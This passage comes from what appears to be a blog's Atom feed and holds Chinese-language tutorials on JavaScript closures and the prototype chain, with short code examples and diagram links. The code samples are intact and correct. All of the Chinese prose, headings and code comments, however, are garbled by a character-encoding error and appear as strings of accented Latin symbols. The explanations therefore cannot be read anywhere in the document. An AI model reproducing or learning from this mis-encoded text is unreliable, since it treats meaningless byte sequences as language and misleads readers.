ä¸Šé¢çš„<code>ä½œç”¨åŸŸ</code>æˆ‘ä»¬çŸ¥é“ï¼Œå‡½æ•°çš„ä½œç”¨åŸŸæ˜¯<strong>ç¼–å†™æ—¶å®šä¹‰</strong>çš„è€Œä¸æ˜¯è¿è¡Œæ—¶å†³å®šçš„ï¼Œæ‰€ä»¥æˆ‘ä»¬é€šè¿‡å‡½æ•°å†…éƒ¨è¿”å›å‡½æ•°æ—¶ï¼Œè¿”å›å‡ºæ¥çš„å‡½æ•°çš„ä½œç”¨åŸŸé“¾çš„<strong>èµ·å§‹ä½ç½®</strong>ä¾ç„¶æ˜¯é‚£ä¸ªå‡½æ•°å†…éƒ¨ã€‚ç”±äºåœ¨å‡½æ•°å¤–éƒ¨å¯¹å‡½æ•°å†…éƒ¨å€¼å­˜åœ¨å¼•ç”¨çš„å…³ç³»ï¼Œ<strong>åƒåœ¾å›æ”¶æœºåˆ¶</strong>å¹¶ä¸ä¼šå°†å˜é‡å›æ”¶è€Œæ˜¯ä¼šä¸€ç›´åœ¨å‡½æ•°å†…éƒ¨å¼•ç”¨ã€‚</p><h3 id="é—­åŒ…çš„ç‰¹æ€§"><a href="#é—­åŒ…çš„ç‰¹æ€§" class="headerlink" title="é—­åŒ…çš„ç‰¹æ€§"></a>é—­åŒ…çš„ç‰¹æ€§</h3><p>æ ¹æ®é—­åŒ…çš„å®šä¹‰æˆ‘ä»¬èƒ½å¾ˆå®¹æ˜“è®°ä½å…¶ä¸¤å¤§ç‰¹ç‚¹ï¼š</p><p>1ã€èƒ½å¤Ÿè®°ä½å¹¶è®¿é—®å®ƒçš„è¯æ³•ä½œç”¨åŸŸ<br>2ã€å³ä½¿åœ¨å®ƒçš„ä½œç”¨åŸŸå¤–æ‰§è¡Œ</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="keyword">var</span> a = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">bar</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="built_in">console</span>.log( a );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> bar;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> baz = foo();</span><br><span class="line"></span><br><span class="line">baz(); <span class="comment">// 2 -- å“‡å™¢ï¼Œçœ‹åˆ°é—­åŒ…äº†ï¼Œä¼™è®¡ã€‚</span></span><br></pre></td></tr></table></figure><ul><li><code>bar()</code> è¢«æ‰§è¡Œäº†ï¼Œå¿…ç„¶çš„ã€‚ä½†æ˜¯åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œå®ƒæ˜¯åœ¨å®ƒè¢«å£°æ˜çš„è¯æ³•ä½œç”¨åŸŸ å¤–éƒ¨ è¢«æ‰§è¡Œçš„ã€‚</li><li><code>foo()</code> è¢«æ‰§è¡Œä¹‹åï¼Œä¸€èˆ¬è¯´æ¥æˆ‘ä»¬ä¼šæœŸæœ› <code>foo()</code> çš„æ•´ä¸ªå†…éƒ¨ä½œç”¨åŸŸéƒ½å°†æ¶ˆå¤±ï¼Œå› ä¸ºæˆ‘ä»¬çŸ¥é“ å¼•æ“ å¯ç”¨äº† åƒåœ¾å›æ”¶å™¨ åœ¨å†…å­˜ä¸å†è¢«ä½¿ç”¨æ—¶æ¥å›æ”¶å®ƒä»¬ã€‚å› ä¸ºå¾ˆæ˜¾ç„¶ <code>foo()</code> çš„å†…å®¹ä¸å†è¢«ä½¿ç”¨äº†ï¼Œæ‰€ä»¥çœ‹èµ·æ¥å®ƒä»¬å¾ˆè‡ªç„¶åœ°åº”è¯¥è¢«è®¤ä¸ºæ˜¯ æ¶ˆå¤±äº†ã€‚</li><li>ä½†æ˜¯é—­åŒ…çš„â€œé­”æ³•â€ä¸ä¼šè®©è¿™å‘ç”Ÿã€‚å†…éƒ¨çš„ä½œç”¨åŸŸå®é™…ä¸Š ä¾ç„¶ â€œåœ¨ä½¿ç”¨â€ï¼Œå› æ­¤å°†ä¸ä¼šæ¶ˆå¤±ã€‚è°åœ¨ä½¿ç”¨å®ƒï¼Ÿå‡½æ•° <code>bar()</code> æœ¬èº«ã€‚</li><li>æœ‰èµ–äºå®ƒè¢«å£°æ˜çš„ä½ç½®ï¼Œ<code>bar()</code> æ‹¥æœ‰ä¸€ä¸ªè¯æ³•ä½œç”¨åŸŸé—­åŒ…è¦†ç›–ç€ <code>foo()</code> çš„å†…éƒ¨ä½œç”¨åŸŸï¼Œé—­åŒ…ä¸ºäº†èƒ½ä½¿ <code>bar()</code> åœ¨ä»¥åä»»æ„çš„æ—¶åˆ»å¯ä»¥å¼•ç”¨è¿™ä¸ªä½œç”¨åŸŸè€Œä¿æŒå®ƒçš„å­˜åœ¨ã€‚</li><li><code>bar()</code> ä¾ç„¶æ‹¥æœ‰å¯¹é‚£ä¸ªä½œç”¨åŸŸçš„å¼•ç”¨ï¼Œè€Œè¿™ä¸ªå¼•ç”¨ç§°ä¸ºé—­åŒ…ã€‚</li></ul><h3 id="é—­åŒ…ä½¿ç”¨åœºæ™¯"><a href="#é—­åŒ…ä½¿ç”¨åœºæ™¯" class="headerlink" title="é—­åŒ…ä½¿ç”¨åœºæ™¯"></a>é—­åŒ…ä½¿ç”¨åœºæ™¯</h3><h4 id="æ— å¤„ä¸åœ¨çš„é—­åŒ…"><a href="#æ— å¤„ä¸åœ¨çš„é—­åŒ…" class="headerlink" title="æ— å¤„ä¸åœ¨çš„é—­åŒ…"></a>æ— å¤„ä¸åœ¨çš„é—­åŒ…</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">wait</span>(<span class="params">message</span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">setTimeout( <span class="function"><span class="keyword">function</span> <span class="title">timer</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="built_in">console</span>.log( message );</span><br><span class="line">&#125;, <span class="number">1000</span> );</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">wait( <span class="string">"Hello, closure!"</span> );</span><br></pre></td></tr></table></figure><ul><li>æˆ‘ä»¬æ‹¿æ¥ä¸€ä¸ªå†…éƒ¨å‡½æ•°ï¼ˆåä¸º timerï¼‰å°†å®ƒä¼ é€’ç»™ setTimeout(..)ã€‚ä½†æ˜¯ timer æ‹¥æœ‰è¦†ç›– wait(..) çš„ä½œç”¨åŸŸçš„é—­åŒ…ï¼Œå®é™…ä¸Šä¿æŒå¹¶ä½¿ç”¨ç€å¯¹å˜é‡ message çš„å¼•ç”¨ã€‚</li><li>åœ¨æˆ‘ä»¬æ‰§è¡Œ wait(..) ä¸€åƒæ¯«ç§’ä¹‹åï¼Œè¦ä¸æ˜¯å†…éƒ¨å‡½æ•° timer ä¾ç„¶æ‹¥æœ‰è¦†ç›–ç€ wait() å†…éƒ¨ä½œç”¨åŸŸçš„é—­åŒ…ï¼Œå®ƒæ—©å°±ä¼šæ¶ˆå¤±äº†ã€‚</li><li>åœ¨ å¼•æ“ çš„å†…è„æ·±å¤„ï¼Œå†…å»ºçš„å·¥å…· setTimeout(..) æ‹¥æœ‰ä¸€äº›å‚æ•°çš„å¼•ç”¨ï¼Œå¯èƒ½ç§°ä¸º fn æˆ–è€… func æˆ–è€…å…¶ä»–è¯¸å¦‚æ­¤ç±»çš„ä¸œè¥¿ã€‚å¼•æ“ å»è°ƒç”¨è¿™ä¸ªå‡½æ•°ï¼Œå®ƒè°ƒç”¨æˆ‘ä»¬çš„å†…éƒ¨ timer å‡½æ•°ï¼Œè€Œè¯æ³•ä½œç”¨åŸŸä¾ç„¶å®Œå¥½æ— æŸã€‚</li></ul><h4 id="å¾ªç¯-é—­åŒ…"><a href="#å¾ªç¯-é—­åŒ…" class="headerlink" title="å¾ªç¯ + é—­åŒ…"></a>å¾ªç¯ + é—­åŒ…</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i=<span class="number">1</span>; i&lt;=<span class="number">5</span>; i++) &#123;</span><br><span class="line">setTimeout( <span class="function"><span class="keyword">function</span> <span class="title">timer</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="built_in">console</span>.log( i );</span><br><span class="line">&#125;, i*<span class="number">1000</span> );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™æ®µä»£ç çš„ç²¾ç¥æ˜¯ï¼Œæˆ‘ä»¬ä¸€èˆ¬å°† æœŸå¾… å®ƒçš„è¡Œä¸ºæ˜¯åˆ†åˆ«æ‰“å°æ•°å­—â€œ1â€ï¼Œâ€œ2â€ï¼Œâ€¦â€¦â€œ5â€ï¼Œä¸€æ¬¡ä¸€ä¸ªï¼Œä¸€ç§’ä¸€ä¸ª<br>å®é™…ä¸Šï¼Œå¦‚æœä½ è¿è¡Œè¿™æ®µä»£ç ï¼Œä½ ä¼šå¾—åˆ°â€œ6â€è¢«æ‰“å°5æ¬¡ï¼Œä¸€ç§’ä¸€ä¸ªã€‚</p><p class="tip">æˆ‘ä»¬è¯•å›¾ æš—ç¤º åœ¨è¿­ä»£æœŸé—´ï¼Œå¾ªç¯çš„æ¯æ¬¡è¿­ä»£éƒ½â€œæ•æ‰â€ä¸€ä»½å¯¹ i çš„æ‹·è´ã€‚ä½†æ˜¯ï¼Œè™½ç„¶æ‰€æœ‰è¿™5ä¸ªå‡½æ•°åœ¨æ¯æ¬¡å¾ªç¯è¿­ä»£ä¸­åˆ†ç¦»åœ°å®šä¹‰ï¼Œç”±äºä½œç”¨åŸŸçš„å·¥ä½œæ–¹å¼ï¼Œå®ƒä»¬ éƒ½é—­åŒ…åœ¨åŒä¸€ä¸ªå…±äº«çš„å…¨å±€ä½œç”¨åŸŸä¸Šï¼Œè€Œå®ƒäº‹å®ä¸Šåªæœ‰ä¸€ä¸ª i</p><p>å¦‚ä½•è§£å†³è¿™ä¸ªé—®é¢˜å‘¢ï¼Œå®šä¹‰ä¸€ä¸ªæ–°çš„ä½œç”¨åŸŸï¼Œåœ¨æ¯æ¬¡è¿­ä»£æ—¶æŒæœ‰å€¼ i çš„ä¸€ä¸ªæ‹·è´ã€‚åœ¨æ–°çš„åŒ¿åå‡½æ•°å†…éƒ¨å®šä¹‰äº†ä¸€ä¸ªæ–°çš„å±€éƒ¨ä½œç”¨åŸŸï¼Œiè®¾ç½®ä¸ºäº†æ¯æ¬¡éå†æ—¶çš„å€¼ï¼Œè¿™æ ·ä¾¿ä¸ä¼šç»§ç»­å¾€ä¸Šéå†äº†ã€‚</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i=<span class="number">1</span>; i&lt;=<span class="number">5</span>; i++) &#123;</span><br><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params">j</span>)</span>&#123;</span><br><span class="line">setTimeout( <span class="function"><span class="keyword">function</span> <span class="title">timer</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="built_in">console</span>.log( j );</span><br><span class="line">&#125;, j*<span class="number">1000</span> );</span><br><span class="line">&#125;)( i );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;ä½œç”¨åŸŸ&quot;&gt;&lt;a href=&quot;#ä½œç”¨åŸŸ&quot; class=&quot;headerlink&quot; title=&quot;ä½œç”¨åŸŸ&quot;&gt;&lt;/a&gt;ä½œç”¨åŸŸ&lt;/h2&gt;&lt;p&gt;åœ¨è¿›å…¥ä½œç”¨åŸŸçš„è®¨è®ºä¹‹å‰å…ˆæ˜ä»€ä¹ˆæ˜¯ä½œç”¨åŸŸï¼Œé€šè¿‡ä¸€å¥è¯ç®€å•æè¿°å°±æ˜¯ï¼š&lt;strong&gt;ä¸€ç»„æ˜ç¡®å®šä¹‰çš„è§„åˆ™ï¼Œå®ƒå®šä¹‰å¦‚ä½•åœ¨æŸäº›ä½ç½®å­˜å‚¨å˜é‡ï¼Œä»¥
      
    
    </summary>
    
      <category term="js" scheme="http://zhoushaw.github.io/categories/js/"/>
    
    
      <category term="js" scheme="http://zhoushaw.github.io/tags/js/"/>
    
  </entry>
  
  <entry>
    <title>JavaScriptç³»åˆ—ä¹‹åŸå‹ä¸åŸå‹é“¾</title>
    <link href="http://zhoushaw.github.io/2019/04/20/learning/font-end/js/JavaScript-prototype/"/>
    <id>http://zhoushaw.github.io/2019/04/20/learning/font-end/js/JavaScript-prototype/</id>
    <published>2019-04-20T02:47:35.000Z</published>
    <updated>2019-04-27T13:21:01.129Z</updated>
    
    <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>åœ¨JavaScriptè¯­è¨€ä¸­å®é™…ä¸Šå¹¶ä¸å­˜åœ¨â€œç±»â€ï¼Œé‚£ä¹ˆå®ƒæ˜¯å¦‚ä½•å®ç°<strong>ç»§æ‰¿</strong>ã€<strong>å¤šæ€</strong>ã€<strong>å®ä¾‹åŒ–</strong>ç­‰ç‰¹æ€§å‘¢ã€‚å®ƒé‡‡ç”¨äº†ä¸ç±»ä¸åŒçš„å¦ä¸€ç§æŠ€æœ¯ï¼Œå°†å…¶ç§°ä¹‹ä¸º<strong>åŸå‹</strong>ï¼Œå¹¶é€šè¿‡<strong>åŸå‹é“¾</strong>æ¥å®ç°<strong>ç»§æ‰¿</strong>ã€<strong>å¤šæ€</strong>ç­‰ç‰¹æ€§ã€‚</p><p>ä½†æ˜¯éœ€è¦æ³¨æ„çš„æ˜¯JavaScriptçš„<strong>ç»§æ‰¿</strong>,ä¸Javaçš„ç»§æ‰¿å®é™…ä¸Šæœ‰å¾ˆå¤§çš„åŒºåˆ«ï¼Œåœ¨Javaè¯­è¨€ä¸­ï¼Œ<strong>ç»§æ‰¿</strong>æ˜¯ä¸€ä¸ª<strong>æ‹·è´è¿‡ç¨‹</strong>åœ¨ç‰©ç†åœ°å€ä¸Šå‘ç”Ÿäº†æ‹·è´ï¼Œè€ŒJavaScriptè¯­è¨€æ˜¯é€šè¿‡<strong>åŸå‹é“¾</strong>å°†å…¶â€é“¾æ¥â€åœ¨ä¸€èµ·ï¼Œæ²¡æœ‰å‘ç”Ÿå®é™…çš„æ‹·è´ã€‚</p><div><a id="more"></a></div><h2 id="æ„é€ å‡½æ•°åˆ›å»ºå¯¹è±¡"><a href="#æ„é€ å‡½æ•°åˆ›å»ºå¯¹è±¡" class="headerlink" title="æ„é€ å‡½æ•°åˆ›å»ºå¯¹è±¡"></a>æ„é€ å‡½æ•°åˆ›å»ºå¯¹è±¡</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">function Person() &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">var person = new Person();</span><br><span class="line">person.name = &apos;Kevin&apos;;</span><br><span class="line">console.log(person.name) // Kevin</span><br></pre></td></tr></table></figure><p>åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼ŒPerson å°±æ˜¯ä¸€ä¸ªæ„é€ å‡½æ•°ï¼Œæˆ‘ä»¬ä½¿ç”¨ new åˆ›å»ºäº†ä¸€ä¸ªå®ä¾‹å¯¹è±¡ personã€‚</p><h2 id="åŸå‹"><a href="#åŸå‹" class="headerlink" title="åŸå‹"></a>åŸå‹</h2><h3 id="prototype"><a href="#prototype" class="headerlink" title="prototype"></a>prototype</h3><p>ä»€ä¹ˆæ˜¯åŸå‹å‘¢ï¼Ÿå¯ä»¥è¿™æ ·ç†è§£ï¼šæ¯ä¸€ä¸ªJavaScriptå¯¹è±¡(nullé™¤å¤–)åœ¨åˆ›å»ºçš„æ—¶å€™å°±ä¼šä¸ä¹‹<strong>å…³è”</strong>å¦ä¸€ä¸ªå¯¹è±¡ï¼Œè¿™ä¸ªå¯¹è±¡å°±æ˜¯æˆ‘ä»¬æ‰€è¯´çš„<strong>åŸå‹</strong>ï¼Œæ¯ä¸€ä¸ªå¯¹è±¡éƒ½ä¼šä»<strong>åŸå‹</strong>â€œ<strong>ç»§æ‰¿</strong>â€œå±æ€§ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">function Person() &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">// è™½ç„¶å†™åœ¨æ³¨é‡Šé‡Œï¼Œä½†æ˜¯ä½ è¦æ³¨æ„ï¼š</span><br><span class="line">// prototypeæ˜¯å‡½æ•°æ‰ä¼šæœ‰çš„å±æ€§</span><br><span class="line">Person.prototype.name = &apos;Kevin&apos;;</span><br><span class="line">var person1 = new Person();</span><br><span class="line">var person2 = new Person();</span><br><span class="line">console.log(person1.name) // Kevin</span><br><span class="line">console.log(person2.name) // Kevin</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªå‡½æ•°çš„ prototype å±æ€§åˆ°åº•æŒ‡å‘çš„æ˜¯ä»€ä¹ˆå‘¢ï¼Ÿæ˜¯è¿™ä¸ªå‡½æ•°çš„åŸå‹å—ï¼Ÿ</p><blockquote><p>ä¸Šé¢ä¾‹å­ä¸­çš„è§£é‡Šï¼š</p></blockquote><ul><li><code>Person</code>ä¸ºæ„é€ å‡½æ•°</li><li><code>person1</code>ã€<code>person2</code>ä¸º<code>Person</code>çš„å®ä¾‹</li><li>æ„é€ å‡½æ•°çš„<code>prototype</code>å±æ€§æŒ‡å‘ï¼Œè°ƒç”¨è¯¥æ„é€ å‡½æ•°è€Œåˆ›å»ºçš„å®ä¾‹çš„<strong>åŸå‹</strong></li><li><code>Person.prototype</code>ä¸º<code>person1</code>çš„<strong>åŸå‹</strong></li><li><code>person1</code>ã€<code>person2</code>ç»§æ‰¿äº†åŸå‹ä¸­çš„<code>name</code>å±æ€§</li></ul><p>ç”¨ä¸€å¼ å›¾è§£é‡Š<strong>æ„é€ å‡½æ•°</strong>ä¸<strong>å®ä¾‹åŸå‹</strong>çš„å…³ç³»</p><p><img src="https://s10.mogucdn.com/mlcdn/c45406/190421_21bijk293k7244lgcie0j4fgbe5g2_1058x578.png" alt=""></p><h3 id="proto"><a href="#proto" class="headerlink" title="proto"></a><strong>proto</strong></h3><p>åœ¨ä¸Šé¢çš„<strong>prototype</strong>ä¸­æˆ‘ä»¬è¯¦ç»†æè¿°äº†<strong>æ„é€ å‡½æ•°</strong>å¦‚ä½•ä¸å®ä¾‹åŸå‹è”ç³»èµ·æ¥ï¼Œé‚£<strong>å®ä¾‹</strong>å¦‚ä½•ä¸<strong>å®ä¾‹åŸå‹</strong>ä¹‹é—´å¦‚ä½•è”ç³»å‘¢ï¼Ÿ</p><p>åœ¨æ ‡å‡†æµè§ˆå™¨ä¸­æ„é€ å‡½æ•°çš„<strong>å®ä¾‹</strong>éƒ½æ‹¥æœ‰ä¸€ä¸ª<code>__proto__</code>å±æ€§ï¼Œé€šè¿‡è¿™ä¸ª<strong>å®ä¾‹</strong>ä¸Šçš„<strong>å±æ€§</strong>å¯ä»¥æ‰¾åˆ°è¿™ä¸ªå®ä¾‹çš„åŸå‹</p><p><img src="https://s10.mogucdn.com/mlcdn/c45406/190421_1235011ggh2af3b01hj7941010l4l_990x668.png" alt=""></p><h3 id="constructor-NaN"><a href="#constructor-NaN" class="headerlink" title="constructor"></a>constructor</h3><p>æ¯ä¸ªåŸå‹éƒ½æœ‰ä¸€ä¸ª <strong>constructor</strong> å±æ€§æŒ‡å‘å…³è”çš„æ„é€ å‡½æ•°</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">function Person() &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">console.log(Person === Person.prototype.constructor); // true</span><br></pre></td></tr></table></figure><p><img src="https://s10.mogucdn.com/mlcdn/c45406/190421_1345h0c13a027556c48j45lj2ib2e_1104x556.png" alt=""></p><p>ç»¼ä¸Šæˆ‘ä»¬å·²ç»å¾—å‡ºï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">function Person() &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var person = new Person();</span><br><span class="line"></span><br><span class="line">console.log(person.__proto__ == Person.prototype) // true</span><br><span class="line">console.log(Person.prototype.constructor == Person) // true</span><br><span class="line">// é¡ºä¾¿å­¦ä¹ ä¸€ä¸ªES5çš„æ–¹æ³•,å¯ä»¥è·å¾—å¯¹è±¡çš„åŸå‹</span><br><span class="line">console.log(Object.getPrototypeOf(person) === Person.prototype) // true</span><br></pre></td></tr></table></figure><p>å¹¶ä¸”æˆ‘ä»¬å¾—å‡ºäº†ï¼š<code>æ„é€ å‡½æ•°</code>ã€<code>åŸå‹</code>ã€<code>å®ä¾‹</code>ä¹‹é—´çš„å…³ç³»</p><p><img src="https://s10.mogucdn.com/mlcdn/c45406/190421_7b4h6c755ckcg3ig1719c71jjdlcc_1244x990.png" alt=""></p><h2 id="å®ä¾‹ä¸åŸå‹"><a href="#å®ä¾‹ä¸åŸå‹" class="headerlink" title="å®ä¾‹ä¸åŸå‹"></a>å®ä¾‹ä¸åŸå‹</h2><p>å½“æˆ‘ä»¬è¯»å–<strong>å¯¹è±¡</strong>å±æ€§æ—¶ï¼Œè‹¥æˆ‘ä»¬è¯»å–çš„å¯¹è±¡ä¸å­˜åœ¨ï¼Œå°†ä¼šè‡ªåŠ¨åˆ°å¯¹è±¡çš„<strong>åŸå‹</strong>ä¸ŠæŸ¥æ‰¾å±æ€§æ˜¯å¦å­˜åœ¨ï¼Œå¦‚æœå±æ€§ä¸å­˜åœ¨å°†ä¼šåˆ°<strong>åŸå‹çš„åŸå‹</strong>ä¸ŠæŸ¥æ‰¾ï¼Œä¸€ç›´ä¼šæ‰¾åˆ°nullä¸ºæ­¢</p><p>é€šè¿‡ğŸŒ°æˆ‘ä»¬æ¥è¿›è¡Œè¯´æ˜ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">function Person() &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Person.prototype.name = &apos;Kevin&apos;;</span><br><span class="line"></span><br><span class="line">var person = new Person();</span><br><span class="line"></span><br><span class="line">person.name = &apos;Daisy&apos;;</span><br><span class="line">console.log(person.name) // Daisy</span><br><span class="line"></span><br><span class="line">delete person.name;</span><br><span class="line">console.log(person.name) // Kevin</span><br></pre></td></tr></table></figure><p>ç¬¬ä¸€æ¬¡logè¾“å‡ºæ—¶æˆ‘ä»¬å¾—åˆ°äº†é¢„æœŸè¾“å‡º<code>Daisy</code>,éšåæˆ‘ä»¬é€šè¿‡<code>delete</code>å…³é”®è¯åˆ é™¤äº†personå®ä¾‹ä¸Šçš„<code>name</code>å±æ€§ï¼Œç¬¬äºŒæ¬¡è¾“å‡ºæ˜¯é€šè¿‡æŸ¥è¯¢å‘ç°personå®ä¾‹ä¸­å¹¶ä¸å­˜åœ¨å±æ€§<code>name</code>ï¼Œåˆ°<code>person</code>å®ä¾‹çš„åŸå‹<code>Person.prototype</code>ä¸Šè¿›è¡ŒæŸ¥æ‰¾æ‰¾åˆ°<code>name</code>å±æ€§ï¼ŒæŸ¥è¯¢ç»ˆæ­¢ã€‚</p><p>è‹¥<code>Person.prototype</code>ä¸Šä»»ç„¶ä¸å­˜åœ¨<code>name</code>å±æ€§å‘¢ï¼Œå°†ä¼šä»ä½•å¤„è¿›è¡ŒæŸ¥è¯¢?</p><h2 id="åŸå‹çš„åŸå‹"><a href="#åŸå‹çš„åŸå‹" class="headerlink" title="åŸå‹çš„åŸå‹"></a>åŸå‹çš„åŸå‹</h2><p>ä»<code>å®ä¾‹</code>ä¸<code>å®ä¾‹åŸå‹</code>çš„å…³ç³»é‡Œé¢å¯ä»¥çŸ¥é“ï¼Œé€šè¿‡<code>__proto__</code>å±æ€§æˆ‘ä»¬å¯ä»¥æŸ¥è¯¢åˆ°æœŸåŸå‹ï¼Œé‚£ä¹ˆåŸå‹çš„åŸå‹æ˜¯ä»€ä¹ˆå‘¢?</p><p>é€šè¿‡è¿™ä¸ªğŸŒ°æˆ‘ä»¬å¯ä»¥å¾ˆæ¸…æ™°çš„çŸ¥é“ï¼Œæ„é€ å‡½æ•°çš„åŸå‹çš„åŸå‹æ˜¯<code>Object.prototype</code>,<code>Object.prototype</code>çš„åŸå‹æ˜¯<code>null</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function Person()&#123;&#125;</span><br><span class="line">Person.prototype.__proto__ === Object.prototype // true</span><br><span class="line">Object.prototype.__proto__ === null // true</span><br></pre></td></tr></table></figure><p>é€šè¿‡ä¸Šè¿°çš„çŸ¥è¯†ç‚¹æˆ‘ä»¬å¯ä»¥æ„å»ºæˆä¸€å¹…å®Œæ•´çš„å…³ç³»ï¼š</p><p><img src="https://s10.mogucdn.com/mlcdn/c45406/190421_7cebll7hhc7ea3jfe102f2g4fj4fa_836x772.png" alt=""></p><p>å…¶ä¸­<strong>é’è‰²</strong><code>__proto__</code>çš„çº¿è·¯å°±æ˜¯æˆ‘ä»¬é€šå¸¸æ‰€è¯´çš„åŸå‹é“¾</p><h2 id="å‚è€ƒæ–‡ç« "><a href="#å‚è€ƒæ–‡ç« " class="headerlink" title="å‚è€ƒæ–‡ç« "></a>å‚è€ƒæ–‡ç« </h2><ul><li><a href="https://github.com/getify/You-Dont-Know-JS/blob/1ed-zh-CN/this%20%26%20object%20prototypes/ch5.md" target="_blank" rel="noopener">you donâ€™t know js: this &amp; prototype</a></li><li><a href="https://github.com/mqyqingfeng/Blog/issues/2" target="_blank" rel="noopener">JavaScriptæ·±å…¥ä¹‹ä»åŸå‹åˆ°åŸå‹é“¾</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h2&gt;&lt;p&gt;åœ¨JavaScriptè¯­è¨€ä¸­å®é™…ä¸Šå¹¶ä¸å­˜åœ¨â€œç±»â€ï¼Œé‚£ä¹ˆå®ƒæ˜¯å¦‚ä½•å®ç°&lt;strong&gt;ç»§æ‰¿&lt;/strong&gt;ã€&lt;strong&gt;å¤šæ€&lt;/strong&gt;ã€&lt;strong&gt;å®ä¾‹åŒ–&lt;/strong&gt;ç­‰ç‰¹æ€§å‘¢ã€‚å®ƒé‡‡ç”¨äº†ä¸ç±»ä¸åŒçš„å¦ä¸€ç§æŠ€æœ¯ï¼Œå°†å…¶ç§°ä¹‹ä¸º&lt;strong&gt;åŸå‹&lt;/strong&gt;ï¼Œå¹¶é€šè¿‡&lt;strong&gt;åŸå‹é“¾&lt;/strong&gt;æ¥å®ç°&lt;strong&gt;ç»§æ‰¿&lt;/strong&gt;ã€&lt;strong&gt;å¤šæ€&lt;/strong&gt;ç­‰ç‰¹æ€§ã€‚&lt;/p&gt;
